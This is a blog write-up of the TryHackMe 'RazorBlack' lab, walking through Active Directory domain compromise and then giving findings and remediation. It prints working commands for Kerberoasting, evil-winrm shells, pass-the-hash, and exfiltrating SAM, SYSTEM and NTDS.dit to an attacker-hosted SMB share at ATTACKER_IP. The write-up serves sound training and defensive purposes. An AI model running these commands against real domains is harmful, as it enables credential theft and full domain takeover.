---
title: "TryHackMe: RazorBlack"
date: 2026-06-28 23:55:00 +0200
categories: [TryHackMe]
tags:
  - active-directory
  - windows
  - nfs
  - kerberoast
  - winrm
  - backup-operators
  - ntds
  - pass-the-hash
description: >-
  RazorBlack chained an exposed NFS share, credential attacks,
  Kerberoasting, WinRM access, Backup Operators abuse, offline NTDS
  extraction, and Administrator pass-the-hash into full domain compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_razorblack
image:
  path: room_image.webp
  alt: "Original TryHackMe RazorBlack room artwork"
toc: true
comments: false
---

RazorBlack is a domain-compromise lab centered on AD enumeration, credential abuse, and backup privilege misuse. The validated path moved from an exposed NFS export into username generation, Kerberoastable service-account compromise, WinRM access as `xyan1d3`, offline extraction of `NTDS.dit` through `SeBackupPrivilege`, and finally pass-the-hash as `Administrator`.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe RazorBlack room card](room_card.webp){: w="309" h="271" .shadow }](https://tryhackme.com/room/raz0rblack){: .center }

## Initial Enumeration

The target presented as a Windows Server 2019 Active Directory domain controller for:

```text
raz0rblack.thm
HAVEN-DC.raz0rblack.thm
```

Service enumeration identified the core domain stack plus remote management access:

```text
53/tcp,udp   DNS
88/tcp       Kerberos
111/tcp      RPCBind
135/tcp      MSRPC
139,445/tcp  SMB
389,636/tcp  LDAP / LDAPS
2049/tcp     NFS
3389/tcp     RDP
5985/tcp     WinRM
9389/tcp     AD Web Services
```

Anonymous LDAP and SMB enumeration were restricted, and DNS zone transfer was denied. The first meaningful exposure came from NFS.

## Validated Attack Path

1. **Service discovery** — identified a domain controller exposing DNS, Kerberos, LDAP, SMB, NFS, and WinRM.
2. **NFS exposure review** — mounted `/users` and recovered a user text file plus an employee workbook.
3. **Username generation** — derived likely AD usernames from employee names and roles.
4. **Credential recovery** — recovered a reusable low-privilege domain password for `twilliams`.
5. **Kerberoasting** — requested a service ticket for `xyan1d3` and cracked the service-account password offline.
6. **WinRM foothold** — authenticated as `xyan1d3` and confirmed membership in `Backup Operators` and `Remote Management Users`.
7. **NTDS extraction** — used `SeBackupPrivilege` and a VSS snapshot to copy `NTDS.dit` plus SYSTEM/SAM to an attacker SMB share.
8. **Pass-the-hash** — used recovered hashes for `lvetrova` and `Administrator` to access protected user artifacts and administrator-only content.
9. **Artifact recovery** — decrypted DPAPI-protected CLIXML secrets, cracked an archived ZIP, and recovered the remaining objectives.

> **Result:** A low-privilege credential path escalated through Kerberoasting and backup privilege abuse to full domain compromise and Administrator-level access.
{: .prompt-danger }

## Exposed NFS Share

NFS was the first successful data source. The exported share was enumerated and mounted:

```console
$ showmount -e TARGET_IP
$ sudo mount -t nfs -o nolock,vers=3 TARGET_IP:/users /mnt/razor-nfs
```

Files copied from the export included:

```text
sbradley.txt
employee_status.xlsx
```

The text file disclosed one of the room objectives, while the workbook exposed employee names and role information that supported account discovery.

Relevant names included:

```text
Steven Bradley
Ljudmila Vetrova
Tyson Williams
```

This provided the naming material used for Kerberos and directory-focused account enumeration.

## Credential Enumeration and Kerberoasting

Likely usernames were generated from the employee workbook and tested against the domain.

A recovered domain credential was:

```text
twilliams : [REDACTED]
```

That credential enabled authenticated enumeration and was followed by Kerberoasting against service accounts:

```console
$ impacket-GetUserSPNs \
  raz0rblack.thm/twilliams:[REDACTED] \
  -dc-ip TARGET_IP \
  -request

$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hashes
```

The crackable service account was:

```text
xyan1d3 : [REDACTED]
```

This was the decisive credential because the account had both WinRM access and backup-related privileges.

## WinRM Foothold and Backup Privileges

The cracked `xyan1d3` password provided a remote shell:

```console
$ evil-winrm -i TARGET_IP -u xyan1d3 -p [REDACTED]
```

Privilege review confirmed the account was highly overprivileged:

```console
*Evil-WinRM* PS> whoami /all
```

The important conditions were:

```text
Backup Operators
Remote Management Users
SeBackupPrivilege
SeRestorePrivilege
```

On a domain controller, that combination is effectively a direct path to domain-wide credential exposure.

## NTDS Extraction via VSS

The successful extraction path used a Volume Shadow Copy plus an attacker-hosted SMB share.

On the attacker system:

```console
$ impacket-smbserver exfil loot/ntds-exfil \
  -smb2support -username kali -password [REDACTED]
```

On the compromised host:

```console
PS> net use \\\\ATTACKER_IP\\exfil /user:kali [REDACTED]
PS> reg save HKLM\SYSTEM \\\\ATTACKER_IP\\exfil\\SYSTEM.save /y
PS> reg save HKLM\SAM \\\\ATTACKER_IP\\exfil\\SAM.save /y
PS> diskshadow /s C:\Windows\Temp\ds.txt
PS> robocopy /B X:\Windows\NTDS \\\\ATTACKER_IP\\exfil ntds.dit /R:0 /W:0
```

The resulting offline dump was processed with:

```console
$ impacket-secretsdump \
  -ntds ntds.dit \
  -system SYSTEM.save \
  LOCAL
```

This recovered domain credential material including hashes for `lvetrova`, `xyan1d3`, and `Administrator`.

## Pass-the-Hash and Objective Recovery

Recovered NTLM hashes were used for WinRM pass-the-hash access:

```console
$ evil-winrm -i TARGET_IP -u lvetrova -H [REDACTED]
$ evil-winrm -i TARGET_IP -u Administrator -H [REDACTED]
```

This enabled access to:

```text
C:\Users\lvetrova\lvetrova.xml
C:\Users\xyan1d3\xyan1d3.xml
C:\Users\Administrator\root.xml
C:\Windows\trash
C:\Program Files\Top Secret
```

Key results included:

- DPAPI-protected CLIXML files were readable by their owning users and disclosed challenge objectives.
- `root.xml` contained the administrator objective in encoded form.
- `experiment_gone_wrong.zip` stored historical `ntds.dit` and `system.hive` material behind a crackable password.
- `top_secret.png` disclosed the Vim-themed clue `:wq`.

## Residual Artifact Exposure

Multiple files unrelated to core domain operations remained accessible after compromise.

Observed artifacts included:

```text
chat_log_20210222143423.txt
experiment_gone_wrong.zip
top_secret.png
not_a_flag
```

These artifacts increased post-compromise visibility into past activity, credential material, and room objectives.

The ZIP archive password was recovered offline with `zip2john` and `john`, demonstrating that archived sensitive material was also weakly protected.

## Findings

### RB-01 — NFS Share Exposed Sensitive User Data

- **Severity:** High
- **Affected asset(s):** `HAVEN-DC`, NFS `/users` export
- **Impact:** Initial intelligence disclosure and objective exposure

The domain controller exposed a mountable NFS share containing user data and an employee workbook. This directly revealed challenge data and enabled accurate domain username generation.

**Remediation:**

- disable NFS on the domain controller unless it is strictly required;
- restrict exports by source IP and authenticated principals;
- apply least privilege and `root_squash`;
- remove sensitive user data from exported paths.

### RB-02 — Roastable or Reused Credentials Recovered

- **Severity:** High
- **Affected principal(s):** `twilliams`, `sbradley`
- **Impact:** Authenticated foothold and password reuse exposure

Recovered or reused credentials enabled authenticated domain access and expanded the attack surface for later enumeration.

**Remediation:**

- enforce long unique passwords or passphrases;
- monitor for password spraying and Kerberos anomalies;
- reset affected accounts;
- require pre-authentication where applicable.

### RB-03 — Kerberoastable Service Account with WinRM Access

- **Severity:** High
- **Affected principal:** `xyan1d3`
- **Impact:** Interactive shell via cracked service-account password

The `xyan1d3` service account was Kerberoastable and its password was crackable offline. The same account was allowed to connect through WinRM.

**Remediation:**

- use group Managed Service Accounts where possible;
- require high-entropy service-account passwords;
- remove unnecessary SPNs;
- restrict WinRM to tightly controlled management groups and subnets.

### RB-04 — Backup Operators Privileges Enabled NTDS Extraction

- **Severity:** Critical
- **Affected asset(s):** `xyan1d3`, `HAVEN-DC`
- **Impact:** Offline theft of the domain credential database

Membership in `Backup Operators` plus `SeBackupPrivilege` and `SeRestorePrivilege` allowed the attacker to create a VSS snapshot and copy `NTDS.dit` for offline decryption.

**Remediation:**

- remove non-administrative users from `Backup Operators` on domain controllers;
- treat backup privileges as Tier 0 permissions;
- monitor `diskshadow.exe`, `vssadmin.exe`, `reg save`, and `robocopy /B`;
- restrict read access to `C:\Windows\NTDS`.

### RB-05 — Administrator Pass-the-Hash After NTDS Dump

- **Severity:** Critical
- **Affected principal:** `Administrator`
- **Impact:** Full administrative control without the cleartext password

Once the NTDS database was extracted, the recovered Administrator NTLM hash was sufficient for privileged remote access.

**Remediation:**

- rotate `Administrator` and `krbtgt` after any suspected NTDS exposure;
- reduce NTLM usage where feasible;
- use Protected Users or equivalent hardening for administrative identities;
- isolate administration to hardened workstations.

### RB-06 — Sensitive Artifacts Left in User and Trash Directories

- **Severity:** Medium
- **Affected asset(s):** `C:\Windows\trash`, `C:\Program Files\Top Secret`, user profiles
- **Impact:** Disclosure of notes, archived hives, and objectives

Residual operational artifacts remained readable on disk after compromise. This included historical archives, text logs, and clue files.

**Remediation:**

- enforce secure disposal of sensitive files and archives;
- remove administrative artifacts from shared or weakly protected locations;
- scan for archives, hives, and sensitive keywords;
- limit read permissions on administrative directories.

### RB-07 — Secrets Stored in DPAPI-Protected CLIXML Files

- **Severity:** Medium
- **Affected asset(s):** `lvetrova.xml`, `xyan1d3.xml`
- **Impact:** Secrets recoverable after user compromise

DPAPI protected the CLIXML files from unrelated users, but once the owning account was compromised the secrets were trivially recoverable with `Import-Clixml`.

**Remediation:**

- avoid storing long-lived secrets in exported CLIXML files;
- use approved secrets vaults with audit logging;
- rotate any exposed values;
- periodically audit user profiles for credential exports.

## Security Impact

RazorBlack demonstrates how several moderate-to-high weaknesses compound into full domain compromise.

The most important factors were:

- exposed NFS data created a reliable source of usernames and intelligence;
- credential reuse and Kerberoasting produced reusable domain access;
- a service account combined WinRM access with backup-tier privileges;
- backup privileges on a domain controller enabled offline theft of all domain hashes;
- pass-the-hash provided immediate administrator-level access.

The final outcome was complete compromise of the domain controller and exposure of domain-wide credential material.

## Remediation Priorities

1. Remove non-essential `Backup Operators` and `Remote Management Users` memberships from domain accounts.
2. Rotate `Administrator`, `krbtgt`, `xyan1d3`, `lvetrova`, `twilliams`, and `sbradley` credentials.
3. Disable or tightly restrict NFS on the domain controller.
4. Harden service-account management and eliminate crackable Kerberoastable accounts.
5. Restrict WinRM to approved administrative workflows.
6. Add monitoring for VSS abuse, NTDS access, and outbound SMB exfiltration.
7. Remove archived hives, ZIP files, and clue artifacts from sensitive paths.
8. Reduce NTLM dependence and enforce tiered administration.

## Retest Plan

1. Confirm NFS exports are disabled or restricted to approved sources and no sensitive documents remain accessible.
2. Verify recovered passwords and hashes are no longer valid.
3. Confirm Kerberoastable accounts have been remediated or moved to gMSA/high-entropy credentials.
4. Verify low-privilege domain accounts cannot reach WinRM on the domain controller.
5. Confirm `Backup Operators` membership and backup privileges are removed from non-Tier-0 users.
6. Verify `NTDS.dit`, SYSTEM, and SAM cannot be copied through VSS and backup abuse.
7. Confirm administrative artifacts and CLIXML secret exports have been removed or protected.

## Lessons Learned

RazorBlack is a strong example of why AD security depends on controlling both identity exposure and privilege scope.

The initial foothold did not begin with code execution. It began with exposed data. Once the user and password landscape became clearer, Kerberoasting and service-account abuse provided the bridge into remote access. From there, backup-tier privileges on the domain controller erased the boundary between a single user shell and complete domain compromise.

That makes three defensive themes especially important: reduce information exposure, harden service accounts, and treat backup privileges on domain controllers as highly privileged administrative access.
